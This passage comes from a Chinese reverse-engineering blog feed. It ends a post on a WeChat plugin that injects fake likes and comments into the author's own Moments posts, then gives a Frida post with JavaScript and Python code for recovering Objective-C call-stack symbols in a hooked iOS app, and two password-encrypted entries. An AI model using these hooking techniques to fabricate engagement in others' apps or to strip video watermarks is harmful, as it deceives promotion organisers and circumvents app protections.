title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-07-30T07:54:10.968Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX18t0prdqZnaztHCGGsQe1QYOlAzITsHoqNfai3XO3HOLDx03Ut+iD68M/jvHHOG8gir9jXXfMR1If6aBD3hzNHxO+9jHBKVRXmDYh2IeMGHvnES39P/KqOrN5yMuIjPf5WzeOmMouX/RBPeQKTSay9Y3EjkASLCIv4YKRW5CVfsiIxdmPhOkW3aTauBJhKWTcvgmMT9m6QvgZRT9qPi5vuK89/RhKTZrWODQ+E2jO+p0c/1qTOFY8SFnPYfw/MGtdvs/iBHRTwR9bl8TgoetPsUsL/DnDq7eG5X6/6ahkuGPhGgqqXzCmC8SN7ZN9B7t9EQ/fI+z5nEyeKsQfre3DfIwPVn72sOMqwUtXqaDhkRfShpPpovcus8S/m7uCa+sfNXBClAm1pKf62Nfjm7FD2Hq99yR1KinK3fq1aucVSkgubm0gFKFi//hgD9NU7avZbzeqRvd2SWefSjBvaRcLWqLZtuQvm7lEeNWqvHgkKtO2BjyogpHAjEz5I/JWB/A0cIWha1Xrhqy3CufVOwxTwhIMGXmTZebXc6g0zQI/GmIsd7Z/sfotUMJUDT3YVn46Z74SLWmlmFj56wPoLOcd7HZjAn1iqLB4cMj80y4GEOdD3mPVK7ml5oKEcLvwVtQqWBxalWe9199Wjp3kRlxfxk6612xCWQLQgQO6E+l3DHZrIyQL7QTKUMpmil1PRB/pLrZrB2/ciIdMJjPRdvQ0sASzzuWK9ohInZb8ye/crSXWigw/lLIEvD5dxsxrdb2+YENAv59zOeR/3TDZNwy4nzifXS9AUaJ4Lgwc/FqoCTJMI6p4JrWLalTO7QwwxpBMyrkK9cZ9qxReyvxqo6dzCDyx52+RG+f6PPiWyXXXL9ZpgI+db+8/Y80zeDAGQDGw1i678iWhHRZT2i2LG81lGBoFC57EJGBC5kPOULwwGpd0Ow0qSh1ejrBKuJT1a3EgsGw6PiM16zuYQ8fbgfm/fY7p00g0nS1HOdtP8c96BBCm0X2B8+lfHbgTxMb/g18Tp9zsQfjFlKnoDQ2K0JPvBoPxjubepPyVBJB8gdJVpsbi3q47dUCXf/SpaeIB1A+pHKslFbNb+HCK7uLBjw1mVr4SnQvgKvBYFTZ20TANVaHn6T+gAkCiVwtT47nf56Lgzfu33GskD+wNsuG4lV8KThlre130L8/p2VegYNTagVVow4iFxYz/ynoJ+KvlN+NyTJpOMVkKm3kXZi6vZLMOr2s7WESiERE1Hx7cmoD5AIZz3OodPLptZx7j/Y89p2bCI7tkBXcxkTV0nP1xLiIDHumd+3FcFWee3Ub2u3IH3bu2YRLIqEkCZF2uqIl8FdwQkblwcuKU6Mk5IEdSqmkPPYZ/X3NGewh6GzyDhN54pG+d+fJScbc5gPgJMuu9RlOfg08WKuaaeGYL9bt9MJ4v0tzZzxLBeFKewbICKJ1nIxOsppU2BVXKn6wIz5jf2wwXHNeNf7PO1zfyJnY1ubPFhDLKBA0RdwQDoYSYhSjezPDIDDn8Glofj9r+XSfnl2IS3D5xZMaLyj3Lk5v89HJBNOBMLw2PGfS02eb29l1ehFmST6PSrIcBo+NqEmvFZiRszK+x522OVIKENhTyHxCL6L9r6W/MH3Rx5XKsh16t4+nTPyjHNEmt03IiVJar6QR0BbqzAufPMiG3XbS5aImeEvHgFhdreCuMB6n/FllAHniUJk9sYXAhKd1FazWeG1IYBY9Z8l5/rhjNs1BXAYDkrhpDTZM7L8ZMCW/9xfLw4gDsRonTklu2okXvMv8xY5Ts/JkM6Z5e/vzvYW49KVN9Hiw5RQGc3rLC9emSWLI5M9V6m3+aW1q1TePdlYzGj4jJxPfPunla+ISOdEproT6dwRs0YJXC4G8t+vKbmkU9N5xEd+OMFYYgaGkQ8aCYIYVKJhRZEJ7k5qjlUI/cTNz4KXxrq2dYFEnVCxMZukQw3B70WV/x81enMstS695i854YERptwIvPgYkdrqBet1CyevbYIiRPOBxhUuoOnnG8ah4+tCh5pavb1q3i1RjGgOLod8WTKPGGs+SHBpbEsCAqYAax6ixXH0aQ3TVeHijPDqe/eIV3jnFX4s/xt69VMOuVtDHMcgu+DNmDspvnsHXnSe3TbKLL72y05dFLGconjG34K9VAnR9vUW0UM5kQ5PCFHjQZMs06uLkX99uV0YtISnBSokCz/XSwGMuZjGvi2d0mMaSFg4k5/B1efEyN2UP7zwXPIgUx7KBA8Vi2Fes0EUujvUguKiQYdl3uZvfz6Biu/49OXIAQQ2ZJCLD8pe+RJ6+fHK5sqrCWx3TIAfUNR1uHBMBjje48/fpxjGOruZ9N387O87BHaxJ+lY2eDQh0KaVIVcraGh+6sTBTXf0wOpC71yneaOLgu9uWVKWuolJY/RUoERFXiKjbxAyOkMrVVLFxcKhQ4DpIVim6tM5NW5w3uieg6K0b3u76zkrVarObHhePbM7vZC</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+hTEDEWU7UFUhC9qdCys0quk74d/+OOGRcazhVVk7mCoVZCMZXuSNw93ZPmAAg9+tBdLGEP+/zIBs2F95QjPkErIcI7i964WFnG9nJ5p9Il0MwEyZg1/oCzEwmJRBzvtiY1XjDFSTCmq2WPE3huzO5YMhs6RdSEmeBDQFCZ700LXDTZ0JHhToGzRfrz12gdr0MDfhHhoqa089C2mjn1b7Z7e8HOhWhsX/PsjF2SnSdvG3PoDEk9pcFyLmkgahaK8ZSyrC84uaTHiBTA9E8q14YhqlrGSvp/HYb6N3Y32/gD8JK6asuKCGBa1dN9M7BfgYlssP2WRP/yLCp5eObG/WU2ygG2t+4klVdCVfv9qtDc0Dzr368wbKbgZH8cMeB3UOtVxEMfNMY/SLWSjkbIoSK1p5OWQUBUl1PzAf8BY2m2t2fEXz5O6YdQItaEEgthSoa9YqSncGH+DeHtsMR+Voa3SRn1hMKXDQvgpZ/cwZL6vz1inJsIqtQ2McwxBFRsWMUuiFsE3DnxB15kDkmRcNIBxCIR0dkCMHxXjrcbkAfzO5NEj6zHJfLt7VxT2++RHRzjAwmcts1aEkmIsGAeefNwdnfSYL21dQF9Oin6UIKWHofmhLNFeR2zcdIkTnaeop0XBMa3uBsEcTvsVfhstrA4O7Kf6JJ9eyxhy9eSvi7zSV1xyyktvG7Ht8BFGUbogNGHJ0Im3SEkRwp8N5gCbKu0GH/NA9Sw4XNx9unaPJ1uGSBG0pWKXIv5CtyBcYBhdFSoI7aVXumzIjlmhXLH+MXu5jfzBgy1tFo59e+l/umhu29W7a22Js/NsWqArQuXOk+N3arX6AbNZmHJkbIxQlTxVCJQzVlMMaby7+u9tp5vlVywoXZuYFCv7+MnoewHx35PEHDXVH7w24zRjah3OFysswHCXPmq4Rr2hq811iS7mE7u7LfaukUidYcH7/HGgwIg1n0XI0yoQ7FuWa954UfhceaJTZ1hMLuWS19FCGpulGrxzTINC9HFnRwkefUMIMP7toaTtYEhWO5pCeXgGIKzHHql/iGKPP+lRyR9fradoDcXeZemWK3ge5YzJd2r86j26nRgBy/lBB8hSp6uqLKny06DuzqCitXiTYMZAdfHD4E2mQBZAotiAFruTAldNb9r8Km9v+kQ8q2lAQnr0Coi+JGm/irBOVxg1YroOYdy9r9WBBFYV7q3UEyvaPLsNuOvPgr9W7fo20rSApsHRqAJrbgp9jfNhugtdbEog0aK8tSPc6a20fxZK9BZm+kNwhga7kF1J3mz3Xb6gsZcTpAmpUjvBMkyItriKdNJz/2ARETqdMVdF4z+7Z/s1Fp7rUB6qWvuPdGG/XlIASE2XZwE/tjEhM3HVDSEi/+q9c+VZUi6DsaSnQXUFqFXdJUXjghLKB1oJrb8C0QVOIQDrghuMYldLDHZKc5UqfuHXrky2Icm6aQWeWHAXqSOqG2pCq45dLv4w0DLvEqVkqEyDty6HgpkxIfgdWL+4Wa9+VZ3L84Q/DYibpc0/ZMWdK3KADc0PSlEVag23/8